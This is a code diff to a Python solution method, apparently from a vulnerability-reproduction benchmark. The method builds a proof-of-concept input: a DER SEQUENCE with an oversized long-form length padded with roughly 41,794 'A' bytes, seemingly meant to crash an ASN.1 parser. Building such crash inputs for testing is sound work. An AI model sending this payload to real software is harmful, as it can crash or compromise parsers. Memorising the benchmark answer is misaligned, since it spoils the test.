@@ -1,10 +1,7 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        seq_tag = b'\x30'
-        seq_len = b'\x82\xa3\x42'
-        int1_tag = b'\x02'
-        int1_len = b'\x82\xa3\x3b'
-        data1 = b'A' * 41787
-        int2 = b'\x02\x01\x00'
-        poc = seq_tag + seq_len + int1_tag + int1_len + data1 + int2
+        L = 41798
+        content_len = L - 1 - 3
+        length_bytes = bytes([0x82, (content_len >> 8) & 0xFF, content_len & 0xFF])
+        poc = b'\x30' + length_bytes + b'A' * content_len
         return poc
